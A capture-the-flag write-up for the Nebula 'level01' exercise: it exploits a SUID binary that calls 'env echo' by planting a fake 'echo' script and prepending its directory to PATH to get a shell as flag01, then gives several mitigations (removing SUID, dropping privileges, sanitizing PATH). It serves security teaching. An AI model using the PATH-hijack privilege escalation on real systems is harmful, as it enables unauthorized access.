# Level 01
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the `level01` account with the password `level01`. Files for this level can be found in `/home/flag01`.

## Source code
```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Writeup
The problem in this code is use `eUID` and run `echo` command in simple relative path.
We can cange the `$PATH` variable to run a custom echo command, because `/home/flag01/flag01` binary has `SUID` setted.

Write a custom `echo` command inside our home directory `/home/level01`:

```bash
echo '/bin/sh' > /home/level01/echo
```

Make this script executable:

```bash
chmod +x /home/level01/echo
```

Now if we change `$PATH` variabile by adding `/home/level01` at the start and execute the `/home/flag01/flag01` binary, we get a shell with flag01 account:

```bash
env PATH=/home/level01:$PATH /home/flag01/flag01
```

We can verify it, with `id` command:

```bash
level01@nebula:~$ env PATH=/home/level01:$PATH /home/flag01/flag01 
sh-4.2$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
```

Now we can run `getflag` command:

```bash
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Mitigation #1a

Unset the **SUID** bit of the binary:

```bash
chmod u-s /home/flag01/flag01
```

With this result:

```bash
root@nebula:/home/flag01# ll flag01
-rwxr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01*
```

## Mitigation #1b

If we can't unset the **SUID** bit, we can do a privilege drop before calling the **system()** function:

```c
uid = getuid();
setresuid(-1, uid, -1);

system("/usr/bin/env echo and now what?");
```

The entire code will be:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  uid_t uid;

  uid = getuid();
  setresuid(-1, uid, -1);

  system("/usr/bin/env echo and now what?");
}
```

Save it as **flag01-drop.c** and compile it:

```bash
gcc -o flag01-drop flag01-drop.c
```

Set correct privileges to the binary:

```bash
chown flag01:level01 /home/flag01/flag01-drop
chmod 4750 /home/flag01/flag01-drop
```

With this result:

```bash
root@nebula:/home/flag01# ll flag01-drop
-rwsr-x--- 1 flag01 level01 7246 2023-06-22 01:31 flag01-drop*
```

## Mitigation #2

Modify the repository list in **/etc/apt/sources.list**, by replacing http://us.achive.ubuntu.com/ubuntu/ to http://old-releases.ubuntu.com/ubuntu:

```bash
sed "s/\/\/us\.archive/\/\/old-releases/" /etc/apt/sources.list -i
```

Now we can update the repository:

```bash
apt-get update
```

We can download the source code of **bash**:

```bash
apt-get source bash
```

Build the dipendences:

```bash
apt-get build-dep bash
```

Remove the patch:

```bash
rm bash-4.2/debian/patches/privmode.dpatch
```

Remove all patch's references in the **bash-4.2/debian/rules** file:

```bash
sed "/privmode /d" bash-4.2/debian/rules -i
```

Compile it (without execute unit test):

```bash
cd bash-4.2
DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -us -uc -b
```

Install binaries:

```bash
cd ..
dpkg -i bash_4.2*deb
```

Create the script without privilege modification:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  system("/usr/bin/env echo and now what?");
}
```

Save the script as **flag01-noperm.c** and compile it:

```bash
gcc -o flag01-noperm flag01-noperm.c
```

Set correct privileges to the binary:

```bash
chown flag01:level01 /home/flag01/flag01-noperm
chmod 4750 /home/flag01/flag01-noperm
```

With this result:

```bash
root@nebula:/home/flag01# ll flag01-noperm
-rwsr-x--- 1 flag01 level01 7169 2023-06-22 03:30 flag01-noperm*
```

## Mitigation #3

This binary use the environment variable **PATH** that is not checked before execute the system call **system()**.

We can **sanitize** the environment variable **PATH** with:

- **Filter**: remove the all custom directory from the variable by setting the path with all standard directory of the UNIX system.
- **Validation**: No one, because we setting the correct path and not the attacker.

We can use the function **putenv()** to set specific value to any environment variable:

```c
putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin");
```

The code will be:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin");
  system("/usr/bin/env echo and now what?");
}
```

Save it as **flag01-sanitize.c** and compile it:

```bash
gcc -o /home/flag01/flag01-sanitize /home/flag01/flag01-sanitize.c
```

Set correct owner and permissions:

```bash
chown flag01:level01 /home/flag01/flag01-sanitize
chmod 4750 /home/flag01/flag01-sanitize
```

We can try again the exploit and this is the result:

```bash
level01@nebula:/home/flag01$ env PATH=/home/level01:$PATH /home/flag01/flag01-sanitize
and now what?
```